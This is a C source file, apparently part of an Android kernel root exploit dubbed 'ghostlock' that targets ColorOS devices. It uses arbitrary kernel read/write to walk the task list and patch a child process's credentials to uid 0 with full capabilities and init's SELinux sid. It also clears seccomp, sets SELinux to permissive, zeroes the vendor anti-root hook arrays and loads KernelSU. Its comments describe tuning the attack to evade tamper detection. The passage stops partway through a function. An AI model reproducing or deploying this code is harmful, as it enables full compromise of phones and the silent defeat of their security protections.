#include "common.h"

int root_child_done;
int root_magica_done;
/* Set by install_child_root when the UMH path succeeds: the kernel spawned
 * the root sh asynchronously, so root_child_done/root_uid_after (cred-patch
 * child only) stay 0 — the final verdict must consult this flag instead. */
int umh_root_done;
uint8_t selinux_before = 0xff;
uint8_t selinux_after = 0xff;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;
uint64_t capable_head_before;
uint64_t capable_head_after;
uint64_t init_tasks_prev;
int setgid_ret = -1;
int setuid_ret = -1;
int setenforce_ret = -1;
int setenforce_errno;
uint64_t current_task_addr;
uint64_t current_cred_addr;
uint64_t current_real_cred_addr;
uint64_t current_cred_security_addr;
uint64_t current_real_cred_security_addr;
uint32_t cred_sid_before = 0xffffffff;
uint32_t cred_sid_after = 0xffffffff;
uint32_t real_cred_sid_before = 0xffffffff;
uint32_t real_cred_sid_after = 0xffffffff;
uint32_t target_cred_osid = SELINUX_KERNEL_SID;
uint32_t target_cred_sid = SELINUX_KERNEL_SID;
uint32_t selinux_cred_blob_off = SELINUX_CRED_BLOB_OFF;
int task_walk_iters;
uint64_t task_walk_last_entry;
uint32_t task_walk_last_pid;
uint32_t task_walk_last_tgid;
uint32_t found_task_pid;
uint32_t found_task_tgid;
char found_task_comm[TASK_COMM_LEN + 1];
pid_t root_child_pid = -1;
int root_ready_pipe[2] = {-1, -1};
struct root_shared *root_shared;

int spawn_root_child(void) {
  int prot = PROT_READ | PROT_WRITE;
  int flags = MAP_SHARED | MAP_ANONYMOUS;
  root_shared = SYSCHK(mmap(NULL, sizeof(*root_shared), prot, flags, -1, 0));
  memset(root_shared, 0, sizeof(*root_shared));
  SYSCHK(pipe(root_ready_pipe));

  root_child_pid = SYSCHK(fork());
  if (root_child_pid == 0) {
    close(root_ready_pipe[0]);

    prctl(PR_SET_NAME, "ll_root_child");
    char ready = 1;
    SYSCHK(write(root_ready_pipe[1], &ready, sizeof(ready)));

    for (int i = 0; i < 20000; i++) {
      if (atomic_load(&root_shared->go)) {
        break;
      }
      usleep(1000);
    }
    if (!atomic_load(&root_shared->go)) {
      _exit(2);
    }

    /* oplus anti-root neutralization (oppo-unhook parity): the child's
     * cred is ALREADY patched to uid 0 by the parent, so kallsyms shows
     * real addresses. Scan for the ColorOS security hook arrays BEFORE
     * setuid(0) — that syscall is what oplus_root_check detects. The
     * parent zeroes the arrays, then we proceed undetected.
     * AUDIT (run148): no oplus symbols in the first 2MB — also dump the
     * FULL kallsyms to /data/local/tmp/ksyms.txt for offline analysis,
     * restore kptr_restrict after the scan, and guard the read with
     * SIGALRM (kallsyms seq_file reads can hang forever). */
    {
      uint64_t pre = 0, post = 0;
      int kf = open("/proc/sys/kernel/kptr_restrict", O_WRONLY | O_CLOEXEC);
      int saved_kptr = 2;
      {
        int kr = open("/proc/sys/kernel/kptr_restrict", O_RDONLY | O_CLOEXEC);
        if (kr >= 0) {
          char kb[16] = {0};
          ssize_t n = read(kr, kb, sizeof(kb) - 1);
          close(kr);
          if (n > 0) {
            saved_kptr = atoi(kb);
          }
        }
      }
      if (kf >= 0) {
        (void)write(kf, "0\n", 2);
        close(kf);
      }
      /* SIGALRM guard: a wedged kallsyms read must not stall the child */
      struct sigaction sa_old, sa_new;
      memset(&sa_new, 0, sizeof(sa_new));
      sa_new.sa_handler = SIG_IGN;
      sigemptyset(&sa_new.sa_mask);
      sa_new.sa_flags = 0;
      sigaction(SIGALRM, &sa_new, &sa_old);
      alarm(20);
      int ksfd = open("/proc/kallsyms", O_RDONLY | O_CLOEXEC);
      int dumpfd = open("/data/local/tmp/ksyms.txt",
                        O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
      if (ksfd >= 0) {
        /* 8MB cap: oplus hook arrays live in .data (later in the seq_file;
         * 2MB only covers core text — run149 missed them). */
        size_t cap = 8u << 20;
        char *kbuf = malloc(cap);
        if (kbuf) {
          size_t klen = 0;
          while (klen < cap) {
            ssize_t n = read(ksfd, kbuf + klen, cap - klen);
            if (n <= 0) {
              break;
            }
            klen += (size_t)n;
          }
          if (dumpfd >= 0) {
            (void)write(dumpfd, kbuf, klen);
          }
          char *p = kbuf;
          char *end = kbuf + klen;
          while (p < end) {
            char *nl = memchr(p, '\n', (size_t)(end - p));
            if (!nl) {
              break;
            }
            *nl = '\0';
            if (strstr(p, "oplus_pre_hook_array")) {
              pre = strtoull(p, NULL, 16);
            } else if (strstr(p, "oplus_post_hook_array")) {
              post = strtoull(p, NULL, 16);
            } else if (strstr(p, "oplus_") || strstr(p, "root_check") ||
                       strstr(p, "security_guard") || strstr(p, " anti")) {
              pr_info("child oplus sym: %s\n", p);
              fsync(STDERR_FILENO);
            }
            p = nl + 1;
          }
          free(kbuf);
        }
        close(ksfd);
      }
      if (dumpfd >= 0) {
        close(dumpfd);
      }
      alarm(0);
      sigaction(SIGALRM, &sa_old, NULL);
      /* restore kptr_restrict (tamper surface otherwise) */
      {
        char kb[8];
        int len = snprintf(kb, sizeof(kb), "%d\n", saved_kptr);
        int kw = open("/proc/sys/kernel/kptr_restrict", O_WRONLY | O_CLOEXEC);
        if (kw >= 0) {
          (void)write(kw, kb, (size_t)len);
          close(kw);
        }
      }
      pr_info("child oplus hooks pre=%016llx post=%016llx\n",
              (unsigned long long)pre, (unsigned long long)post);
      fsync(STDERR_FILENO);
      root_shared->hooks_pre_addr = pre;
      root_shared->hooks_post_addr = post;
      atomic_store(&root_shared->hooks_ready, 1);
      for (int i = 0; i < 10000; i++) {
        if (atomic_load(&root_shared->hooks_zeroed)) {
          break;
        }
        usleep(1000);
      }
      pr_info("child hooks zeroed=%d (proceeding to setuid)\n",
              atomic_load(&root_shared->hooks_zeroed));
      fsync(STDERR_FILENO);
    }

    struct root_report report;
    memset(&report, 0, sizeof(report));
    report.uid_before = getuid();
    errno = 0;
    report.setgid_ret = setgid(0);
    report.setgid_errno = errno;
    errno = 0;
    report.setuid_ret = setuid(0);
    report.setuid_errno = errno;
    report.uid_after = getuid();
    report.gid_after = getgid();
    report.euid_after = geteuid();
    report.egid_after = getegid();
    int enforce_fd = -1;
    char *keep_enf = getenv("GHOSTLOCK_KEEP_ENFORCING");
    if (!keep_enf || keep_enf[0] != '1') {
      /* default: drop to permissive while the child works (init sid may
       * not cover every op). GHOSTLOCK_KEEP_ENFORCING=1 experiments with
       * staying enforcing — the least-detectable mode if the chain holds. */
      enforce_fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
    }
    if (keep_enf && keep_enf[0] == '1') {
      report.setenforce_ret = 0; /* skipped by request */
      report.setenforce_errno = 0;
    }
    if (enforce_fd >= 0) {
      ssize_t wrote = write(enforce_fd, "0", 1);
      report.setenforce_ret = wrote == 1 ? 0 : -1;
      report.setenforce_errno = wrote == 1 ? 0 : errno;
      close(enforce_fd);
    } else if (!keep_enf || keep_enf[0] != '1') {
      report.setenforce_ret = -1;
      report.setenforce_errno = errno;
    }
    report.su_daemon_pid = -1;
    /* Stealth defaults (run114 aftermath): every filesystem/property
     * artifact we leave behind is a ColorOS tamper-detection signal
     * (ro.debuggable=1 -> security reboot ~20min later; apex su write;
     * wallpaper overwrite). Root access comes from the KSU kernel module
     * + the preinstalled /system/bin/su — the embedded copies are pure
     * detection surface. Opt in per feature:
     *   GHOSTLOCK_EMBED_SU=1   embedded su binary + daemon
     *   GHOSTLOCK_WALLPAPER=1  wallpaper overwrite */
    char *want_su = getenv("GHOSTLOCK_EMBED_SU");
    char *want_wp = getenv("GHOSTLOCK_WALLPAPER");
    if (report.setgid_ret == 0 && report.setuid_ret == 0) {
      if (want_su && want_su[0] == '1') {
        errno = 0;
        report.su_install_ret = install_embedded_su(&report.su_daemon_pid);
        report.su_install_errno = errno;
      } else {
        report.su_install_ret = 0;
        report.su_install_errno = 0;
      }
      if (want_wp && want_wp[0] == '1') {
        errno = 0;
        report.wallpaper_ret = install_embedded_wallpaper();
        report.wallpaper_errno = errno;
      } else {
        report.wallpaper_ret = 0;
        report.wallpaper_errno = 0;
      }
    } else {
      report.su_install_ret = 0;
      report.su_install_errno = EPERM;
      report.wallpaper_ret = 0;
      report.wallpaper_errno = EPERM;
    }
    /*
     * Magica jailbreak stages run HERE, in the full-root child (this is
     * the upstream architecture: a root process does the late-load
     * bootstrap). setuid(0) succeeded → this process is real root with
     * kernel-sid cred, and by the time the go-signal is given the parent
     * has already written selinux_state.enforcing=0. Stages:
     *   enable_adb_root  → ro.debuggable=1 / ro.adb.secure=0 + adbd root
     *   try_load         → kernelsu.ko (if present)
     *   soft_reboot      → kill zygote/system_server (ColorOS watchdog)
     * GHOSTLOCK_MAGICA_SOFT_REBOOT=0 skips the soft reboot.
     */
    {
      char *magica = getenv("GHOSTLOCK_MAGICA");
      if (magica && magica[0] == '1') {
        pr_info("root child: Magica jailbreak mode (running as uid=%d)\n",
                getuid());
        fsync(STDERR_FILENO);
        /* adb-root bootstrap (ro.debuggable etc.) is OFF by default now:
         * it was the loudest ColorOS tamper signal in the run114 window
         * (direct property-area write, readable by any daemon until the
         * next boot). KSU + /system/bin/su already provide root shells.
         * Opt back in with GHOSTLOCK_MAGICA_ADB=1. */
        char *want_adb = getenv("GHOSTLOCK_MAGICA_ADB");
        if (want_adb && want_adb[0] == '1') {
          uint16_t port = 5555;
          char *port_str = getenv("GHOSTLOCK_MAGICA_PORT");
          if (port_str && port_str[0]) {
            int p = atoi(port_str);
            if (p > 0 && p <= 65535) {
              port = (uint16_t)p;
            }
          }
          magica_enable_adb_root(port);
        } else {
          pr_info("root child: adb-root skipped (stealth default; "
                  "GHOSTLOCK_MAGICA_ADB=1 to enable)\n");
          fsync(STDERR_FILENO);
        }
        /* a.so parity: exec libksud.so "late-load" (module load + the
         * persistent ksud daemon that survives the framework restart and
         * is what a.so relies on so the zygote kill does not hard reboot).
         * Requires libksud.so (KSU_LIBKSUD_PATH or a KSU manager app under
         * /data/app). Fall back to direct init_module of a local
         * kernelsu.ko if libksud.so is not present. */
        int ko_result = -1;
        int ko_ok = magica_install_kernelsu_aso(&ko_result);
        if (!ko_ok) {
          pr_info("root child: libksud.so late-load unavailable (result=%d); "
                  "falling back to direct kernelsu.ko init_module\n",
                  ko_result);
          fsync(STDERR_FILENO);
          ko_ok = magica_try_load();
        }
        pr_info("root child: kernelsu load result=%d\n", ko_ok);
        fsync(STDERR_FILENO);
        /* JoinChang ghostlock parity: "su -c load_policy (fix SELinux
         * policycap)". Reload the precompiled sepolicy AFTER KSU
         * late-load so the restarted framework spawns apps against a
         * clean policy (app-crash fix). KSU's LSM hooks survive the
         * reload (kernel hooks, not policy rules). */
        if (ko_ok) {
          int lp_ok = magica_load_policy();
          pr_info("root child: load_policy result=%d\n", lp_ok);
          fsync(STDERR_FILENO);
        }
        /* SOFT REBOOT REORDERED (run114 app-crash fix): the zygote kill
         * used to happen right here while misc.fops was still fake —
         * every app the restarting framework spawned opened ashmem
         * through the hook table and crashed. The child now parks on
         * soft_reboot_go (shared memory) and only kills zygote after
         * the parent restored + verified the real fops in
         * try_cfi_stage. */
        /* SOFT REBOOT NOW OPT-IN ONLY. run116 evidence: killing zygote
         * on this ColorOS build escalates to a FULL kernel reboot within
         * ~45s (uptime reset observed), which unloads the KSU module and
         * defeats the whole point. run115 evidence: with all artifacts
         * cleaned (props untouched, kptr restored, .ko unlinked, adbd
         * alive) the device stays stable 55+ min with KSU loaded and NO
         * zygote kill — the tamper watchdog that rebooted run114 was
         * artifact-driven, not timer-driven. Enable explicitly with
         * GHOSTLOCK_MAGICA_SOFT_REBOOT=1 (parked until fops restore). */
        char *soft_rb = getenv("GHOSTLOCK_MAGICA_SOFT_REBOOT");
        if (soft_rb && soft_rb[0] == '1') {
          pr_info("root child: parked for soft reboot (fires after fops "
                  "restore)\n");
          fsync(STDERR_FILENO);
          report.magica_done = 1;
          root_shared->report = report;
          atomic_store(&root_shared->done, 1);
          for (int i = 0; i < 120000; i++) {
            if (atomic_load(&root_shared->soft_reboot_go)) {
              break;
            }
            usleep(1000);
          }
          if (atomic_load(&root_shared->soft_reboot_go)) {
            pr_info("root child: soft reboot now (fops restored; "
                    "watchdog dodge)\n");
            fsync(STDERR_FILENO);
            /* a.so parity: drop to permissive immediately before the kill
             * so the respawned framework starts clean. ColorOS init
             * restores enforcing after the framework restart. */
            {
              int efd2 = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
              if (efd2 >= 0) {
                (void)write(efd2, "0", 1);
                close(efd2);
              }
            }
            magica_soft_reboot();
            _exit(0);
          }
          pr_warning("root child: soft reboot signal timeout — exiting "
                     "without zygote kill\n");
          fsync(STDERR_FILENO);
          _exit(0);
        }
        pr_info("root child: soft reboot skipped (default off; "
                "GHOSTLOCK_MAGICA_SOFT_REBOOT=1 to enable)\n");
        fsync(STDERR_FILENO);
        report.magica_done = 1;
      }
    }
    root_shared->report = report;
    atomic_store(&root_shared->done, 1);
    _exit(report.uid_after == 0 ? 0 : 1);
  }

  close(root_ready_pipe[1]);

  char ready;
  ssize_t got = read(root_ready_pipe[0], &ready, sizeof(ready));
  return got == (ssize_t)sizeof(ready);
}

int collect_root_child(int fd) {
  if (!root_shared) {
    return 0;
  }
  atomic_store(&root_shared->go, 1);

  /* oplus anti-root neutralization (oppo-unhook parity): the child scans
   * kallsyms BEFORE its setuid(0) and stores the hook-array addresses.
   * Zero the function pointers (8B @ 16B stride × 16 entries) so the
   * ColorOS security module no longer intercepts — no watchdog reboot, no
   * newly-spawned-app kills. Hook arrays live in kernel image .data:
   * configfs write, NOT pipe (pipe on image pages panics on PKJ110). */
  for (int i = 0; i < 10000; i++) {
    if (atomic_load(&root_shared->hooks_ready)) {
      break;
    }
    usleep(1000);
  }
  if (atomic_load(&root_shared->hooks_ready)) {
    uint64_t zero = 0;
    int zeroed = 0;
    /* AUDIT: 8 entries (oppo-unhook default entry_cnt), NOT 16 — zeroing
     * beyond the array corrupts adjacent kernel .data. */
    if (root_shared->hooks_pre_addr) {
      for (int e = 0; e < 8; e++) {
        uintptr_t slot =
            (uintptr_t)root_shared->hooks_pre_addr + (uintptr_t)(e * 16);
        if (configfs_write_once(fd, slot, &zero, sizeof(zero)) ==
            (ssize_t)sizeof(zero)) {
          zeroed++;
        }
      }
      pr_info("root oplus pre-hook zeroed %d/8 @ %016llx\n", zeroed,
              (unsigned long long)root_shared->hooks_pre_addr);
      fsync(STDERR_FILENO);
    }
    zeroed = 0;
    if (root_shared->hooks_post_addr) {
      for (int e = 0; e < 8; e++) {
        uintptr_t slot =
            (uintptr_t)root_shared->hooks_post_addr + (uintptr_t)(e * 16);
        if (configfs_write_once(fd, slot, &zero, sizeof(zero)) ==
            (ssize_t)sizeof(zero)) {
          zeroed++;
        }
      }
      pr_info("root oplus post-hook zeroed %d/8 @ %016llx\n", zeroed,
              (unsigned long long)root_shared->hooks_post_addr);
      fsync(STDERR_FILENO);
    }
  } else {
    pr_warning("root child kallsyms scan timeout — proceeding WITHOUT "
               "oplus hook zeroing (tamper detection may fire)\n");
    fsync(STDERR_FILENO);
  }
  atomic_store(&root_shared->hooks_zeroed, 1);

  /* child may run Magica stages (adb-root props, ko load, soft reboot) —
   * allow up to 20s instead of 5s. */
  for (int i = 0; i < 20000; i++) {
    if (atomic_load(&root_shared->done)) {
      break;
    }
    usleep(1000);
  }
  if (!atomic_load(&root_shared->done)) {
    return 0;
  }

  struct root_report report = root_shared->report;
  root_uid_after = report.uid_after;
  root_magica_done = report.magica_done;
  setgid_ret = report.setgid_ret;
  setuid_ret = report.setuid_ret;
  setenforce_ret = report.setenforce_ret;
  setenforce_errno = report.setenforce_errno;
  /* Only an EXPLICIT GHOSTLOCK_MAGICA_SOFT_REBOOT=1 parks the child (it
   * waits for soft_reboot_go after the fops restore). Default (unset or
   * 0): child exits normally — waitpid here; fire_magica_soft_reboot()
   * then no-ops. */
  char *soft_rb = getenv("GHOSTLOCK_MAGICA_SOFT_REBOOT");
  int magica_parked = report.magica_done && soft_rb && soft_rb[0] == '1' &&
                      root_child_pid > 0;
  if (!magica_parked && root_child_pid > 0) {
    waitpid(root_child_pid, NULL, 0);
  }
  return report.uid_after == 0 && report.euid_after == 0 &&
         report.gid_after == 0 && report.egid_after == 0;
}

/* Fire the deferred zygote soft reboot — call ONLY after try_cfi_stage
 * restored and verified the real misc.fops (cfi_stage_done or its fail
 * path ran). Returns 1 if the signal was sent. */
int fire_magica_soft_reboot(void) {
  if (!root_shared || root_child_pid <= 0) {
    return 0;
  }
  char *soft_rb = getenv("GHOSTLOCK_MAGICA_SOFT_REBOOT");
  if (!soft_rb || soft_rb[0] != '1') {
    return 0; /* default off — no parked child to signal */
  }
  if (!root_shared->report.magica_done ||
      !atomic_load(&root_shared->done)) {
    return 0;
  }
  atomic_store(&root_shared->soft_reboot_go, 1);
  waitpid(root_child_pid, NULL, 0);
  root_child_pid = 0;
  return 1;
}

uint64_t find_task_by_tgid(int fd, uint32_t want_tgid) {
  uint64_t head = data_addr(INIT_TASK_TASKS);
  uint64_t canonical_head = canon_addr(INIT_TASK_TASKS);
  /* head/init_task are .data pages: configfs read (pipe read of image
   * pages fails). Other tasks are slab: pipe read (configfs read of slab
   * panics HARDENED_USERCOPY). */
  uint64_t init_task_p0 = data_addr(INIT_TASK);
  uint64_t entry = kernel_read64(fd, head);
  task_walk_iters = 0;
  task_walk_last_entry = 0;
  task_walk_last_pid = 0;
  task_walk_last_tgid = 0;

  for (int i = 0; i < 4096; i++) {
    task_walk_iters = i + 1;
    task_walk_last_entry = entry;
    if (entry == canonical_head || entry == head) {
      break;
    }
    if (!is_direct_ptr(entry)) {
      break;
    }

    uint64_t task = entry - TASK_TASKS_OFF;
    /* is_init must match the LIST NODE address: the walk yields
     * init_task.tasks in canonical form and INIT_TASK_TASKS is the
     * verified symbol (INIT_TASK base itself drifted — run89/90 compared
     * task vs canon_addr(INIT_TASK) and never matched, so init went down
     * the pipe path on a .data page → panic). The first list entry is
     * always init itself, so i==0 is a hard fallback. */
    int is_init = (i == 0) || (entry == canonical_head) ||
                  (entry == canon_addr(INIT_TASK_TASKS)) ||
                  (task == init_task_p0);
    uint32_t pid, tgid;
    char comm[TASK_COMM_LEN + 1];
    memset(comm, 0, sizeof(comm));
    if (is_init) {
      uint64_t p64 = 0, t64 = 0;
      kernel_read_data(fd, task + TASK_PID_OFF, &p64, sizeof(p64));
      pid = (uint32_t)p64;
      kernel_read_data(fd, task + TASK_TGID_OFF, &t64, sizeof(t64));
      tgid = (uint32_t)t64;
      kernel_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);
    } else {
      pid = pipe_read32(fd, task + TASK_PID_OFF);
      tgid = pipe_read32(fd, task + TASK_TGID_OFF);
      pipe_phys_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);
      if (i == 0 && pid == 0 && tgid == 0) {
        /* DIAG: pipe read of slab task failed; cross-check configfs on
         * same bytes (a.so reads task fields via pipe successfully). */
        uint64_t cpid = 0, ctgid = 0;
        kernel_read_data(fd, task + TASK_PID_OFF, &cpid, sizeof(cpid));
        kernel_read_data(fd, task + TASK_TGID_OFF, &ctgid, sizeof(ctgid));
        pr_info("root walk diag task=%016llx pipe_pid=%u pipe_tgid=%u "
                "cfg_pid=%llu cfg_tgid=%llu pipebuf=%016zx idx=%d\n",
                (unsigned long long)task, pid, tgid,
                (unsigned long long)cpid, (unsigned long long)ctgid,
                pipebuf_addr, pipebuf_pipe_idx);
        fsync(STDERR_FILENO);
      }
    }
    task_walk_last_pid = pid;
    task_walk_last_tgid = tgid;
    if (i < 3) {
      pr_info("root walk i=%d entry=%016llx task=%016llx pid=%u tgid=%u "
              "comm=%.16s is_init=%d\n",
              i, (unsigned long long)entry, (unsigned long long)task, pid,
              tgid, comm, is_init);
      fsync(STDERR_FILENO);
    }

    if (tgid == want_tgid || pid == want_tgid) {
      found_task_pid = pid;
      found_task_tgid = tgid;
      memcpy(found_task_comm, comm, sizeof(found_task_comm));
      return task;
    }

    /* Link walk: init_task's tasks.next is .data (configfs); other tasks'
     * tasks.next are slab (pipe). */
    if (is_init) {
      entry = kernel_read64(fd, task + TASK_TASKS_OFF);
    } else {
      entry = pipe_read64(fd, task + TASK_TASKS_OFF);
    }
  }

  return 0;
}

int patch_cred_identity(int fd, uintptr_t cred) {
  if (!is_direct_ptr(cred)) {
    return 0;
  }

  uint64_t zero_ids[4] = {0};
  if (!pipe_phys_write_data(fd, cred + CRED_UID_OFF, zero_ids, sizeof(zero_ids))) {
    return 0;
  }

  uint32_t securebits = 0;
  if (!pipe_phys_write_data(
      fd, cred + CRED_SECUREBITS_OFF, &securebits, sizeof(securebits))) {
    return 0;
  }

  uint64_t caps[CRED_CAP_WORDS] = {
    CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL,
  };
  if (!pipe_phys_write_data(fd, cred + CRED_CAPS_OFF, caps, sizeof(caps))) {
    return 0;
  }

  uint64_t caps_after[CRED_CAP_WORDS] = {0};
  if (!pipe_phys_read_data(
      fd, cred + CRED_CAPS_OFF, caps_after, sizeof(caps_after))) {
    return 0;
  }
  for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
    if (caps_after[i] != CAP_FULL) {
      pr_info("root cap verify failed cred=%016llx idx=%zu got=%016llx want=%016llx\n",
              (unsigned long long)cred, i, (unsigned long long)caps_after[i],
              (unsigned long long)CAP_FULL);
      return 0;
    }
  }

  return 1;
}

int patch_cred_sid(int fd, uintptr_t cred) {
  uint64_t security = pipe_read64(fd, cred + CRED_SECURITY_OFF);
  if (!is_direct_ptr(security)) {
    pr_info("root bad cred security cred=%016llx security=%016llx\n",
            (unsigned long long)cred, (unsigned long long)security);
    return 0;
  }

  uint32_t sid_pair[2] = {
    target_cred_osid, target_cred_sid,
  };
  uintptr_t osid_addr =
    security + selinux_cred_blob_off + SELINUX_CRED_OSID_OFF;
  return pipe_phys_write_data(fd, osid_addr, sid_pair, sizeof(sid_pair));
}

int patch_cred_object(int fd, uintptr_t cred) {
  return patch_cred_identity(fd, cred) && patch_cred_sid(fd, cred);
}

static int patch_task_seccomp(int fd, uintptr_t task) {
  if (!is_direct_ptr(task)) {
    return 0;
  }

  uintptr_t flags_addr = task + TASK_THREAD_INFO_FLAGS_OFF;
  uintptr_t atomic_flags_addr = task + TASK_ATOMIC_FLAGS_OFF;
  uintptr_t seccomp_addr = task + TASK_SECCOMP_OFF;

  uint64_t flags_before = pipe_read64(fd, flags_addr);
  uint64_t atomic_before = pipe_read64(fd, atomic_flags_addr);
  uint32_t mode_before = pipe_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_before =
    pipe_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_before = pipe_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  uint64_t flags_want = flags_before & ~(1ULL << TIF_SECCOMP_BIT);
  uint64_t atomic_want = atomic_before & ~(1ULL << PFA_NO_NEW_PRIVS_BIT);
  uint32_t zero32 = 0;
  uint64_t zero64 = 0;

  int ok = 1;
  if (flags_want != flags_before) {
    ok &= pipe_write64(fd, flags_addr, flags_want);
  }
  if (atomic_want != atomic_before) {
    ok &= pipe_write64(fd, atomic_flags_addr, atomic_want);
  }
  ok &= pipe_phys_write_data(
    fd, seccomp_addr + SECCOMP_MODE_OFF, &zero32, sizeof(zero32));
  ok &= pipe_phys_write_data(
    fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF, &zero32, sizeof(zero32));
  ok &= pipe_phys_write_data(
    fd, seccomp_addr + SECCOMP_FILTER_OFF, &zero64, sizeof(zero64));

  uint64_t flags_after = pipe_read64(fd, flags_addr);
  uint64_t atomic_after = pipe_read64(fd, atomic_flags_addr);
  uint32_t mode_after = pipe_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_after = pipe_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_after = pipe_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  pr_info("root seccomp patched ok=%d flags=%016llx/%016llx "
          "atomic=%016llx/%016llx mode=%u/%u count=%u/%u "
          "filter=%016llx/%016llx\n",
          ok, (unsigned long long)flags_before,
          (unsigned long long)flags_after,
          (unsigned long long)atomic_before,
          (unsigned long long)atomic_after, mode_before, mode_after,
          count_before, count_after, (unsigned long long)filter_before,
          (unsigned long long)filter_after);

  int tif_clear = (flags_after & (1ULL << TIF_SECCOMP_BIT)) == 0;
  int nnp_clear = (atomic_after & (1ULL << PFA_NO_NEW_PRIVS_BIT)) == 0;
  return ok && tif_clear && nnp_clear && mode_after == 0 &&
         count_after == 0 && filter_after == 0;
}

int install_android_root(int fd) {
  root_uid_before = getuid();
  pr_info("root enter uid=%u\n", root_uid_before);
  fsync(STDERR_FILENO);
  if (!spawn_root_child()) {
    pr_info("root spawn failed child=%d\n", root_child_pid);
    return 0;
  }
  pr_info("root spawned child=%d\n", root_child_pid);
  fsync(STDERR_FILENO);

  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  /* .data pages (selinux_state/blob/init_task) MUST use configfs: pipe
   * read of image pages panics on PKJ110 (crash right after spawn).
   * Slab objects (task/cred) use pipe (works after O_NONBLOCK fix). */
  kernel_read_data(fd, selinux_addr, &selinux_before, sizeof(selinux_before));
  {
    uint32_t blob = 0;
    if (kernel_read_data(fd, data_addr(SELINUX_BLOB_SIZES), &blob,
                         sizeof(blob)) == (ssize_t)sizeof(blob)) {
      selinux_cred_blob_off = blob;
    } else {
      selinux_cred_blob_off = 0;
    }
  }
  /*
   * a.so uses init's selinux sid as the target (not kernel sid=1). A
   * kernel-domain sid on a shell child trips ColorOS vendor hooks: the
   * tamper tag gets set, the watchdog fires the 15s reboot, and newly
   * spawned apps get killed at startup. init's sid is a legitimate
   * privileged domain that ColorOS accepts. Fall back to KERNEL_SID if
   * the init read fails.
   *
   * init_task base = INIT_TASK_TASKS - TASK_TASKS_OFF (INIT_TASK_TASKS is
   * the verified symbol — the walk in run89-91 died on init, and the
   * INIT_TASK base symbol drifted). init lives in .data → configfs only.
   */
  target_cred_osid = SELINUX_KERNEL_SID;
  target_cred_sid = SELINUX_KERNEL_SID;
  {
    uintptr_t init_task_base = data_addr(INIT_TASK_TASKS) - TASK_TASKS_OFF;
    uintptr_t init_cred = kernel_read64(fd, init_task_base + TASK_CRED_OFF);
    /* AUDIT BUG-4: init_cred is the static .data structure → configfs is
     * fine for the pointers, BUT init_sec (cred->security) points at the
     * SELinux cred blob which is a kmalloc SLAB object — configfs reads
     * of slab hit HARDENED_USERCOPY (run20 lesson). The osid/sid values
     * MUST go through pipe physrw (same path as the child cred reads;
     * pipe physrw is already proven at this point). */
    if (is_kernel_ptr(init_cred)) {
      uintptr_t init_sec = kernel_read64(fd, init_cred + CRED_SECURITY_OFF);
      if (is_kernel_ptr(init_sec)) {
        uint32_t osid = pipe_read32(
            fd, init_sec + selinux_cred_blob_off + SELINUX_CRED_OSID_OFF);
        uint32_t sid = pipe_read32(
            fd, init_sec + selinux_cred_blob_off + SELINUX_CRED_SID_OFF);
        if (osid != 0 && sid != 0) {
          target_cred_osid = osid;
          target_cred_sid = sid;
          pr_info("root using init selinux sid osid=%u sid=%u\n", osid,
                  sid);
          fsync(STDERR_FILENO);
        } else {
          pr_warning("root init sid pipe read failed init_sec=%016llx "
                     "osid=%u sid=%u (staying on KERNEL_SID)\n",
                     (unsigned long long)init_sec, osid, sid);
          fsync(STDERR_FILENO);
        }
      }
    }
  }

  init_tasks_prev = kernel_read64(fd, data_addr(INIT_TASK_TASKS) + 8);
  pr_info("root init_tasks_prev=%016llx selinux_before=%u blob_off=%u\n",
          (unsigned long long)init_tasks_prev, selinux_before,
          selinux_cred_blob_off);
  fsync(STDERR_FILENO);
  if (!is_direct_ptr(current_task_addr)) {
    current_task_addr = 0;
  }

  if (!is_direct_ptr(init_tasks_prev)) {
    pr_info("root bad init_tasks_prev=%016llx selinux_before=%u\n",
            (unsigned long long)init_tasks_prev, selinux_before);
    return 0;
  }
  current_task_addr = init_tasks_prev - TASK_TASKS_OFF;
  pr_info("root current_task=%016llx\n",
          (unsigned long long)current_task_addr);
  fsync(STDERR_FILENO);

  /* current_task_addr may be init_task (.data) — configfs; else slab —
   * pipe (configfs slab read panics HARDENED_USERCOPY). */
  if (current_task_addr == data_addr(INIT_TASK)) {
    uint64_t pid64 = 0, tgid64 = 0;
    kernel_read_data(fd, current_task_addr + TASK_PID_OFF, &pid64,
                     sizeof(pid64));
    found_task_pid = (uint32_t)pid64;
    kernel_read_data(fd, current_task_addr + TASK_TGID_OFF, &tgid64,
                     sizeof(tgid64));
    found_task_tgid = (uint32_t)tgid64;
    memset(found_task_comm, 0, sizeof(found_task_comm));
    kernel_read_data(fd, current_task_addr + TASK_COMM_OFF,
                     found_task_comm, TASK_COMM_LEN);
  } else {
    found_task_pid = pipe_read32(fd, current_task_addr + TASK_PID_OFF);
    found_task_tgid = pipe_read32(fd, current_task_addr + TASK_TGID_OFF);
    memset(found_task_comm, 0, sizeof(found_task_comm));
    pipe_phys_read_data(fd, current_task_addr + TASK_COMM_OFF,
                        found_task_comm, TASK_COMM_LEN);
  }
  if (found_task_tgid != (uint32_t)root_child_pid) {
    current_task_addr = find_task_by_tgid(fd, (uint32_t)root_child_pid);
    if (!is_direct_ptr(current_task_addr)) {
      pr_info("root task walk failed want=%u iters=%d last=%016llx pid=%u tgid=%u\n",
              (uint32_t)root_child_pid, task_walk_iters,
              (unsigned long long)task_walk_last_entry, task_walk_last_pid,
              task_walk_last_tgid);
      return 0;
    }
  }

  uintptr_t real_cred_slot = current_task_addr + TASK_REAL_CRED_OFF;
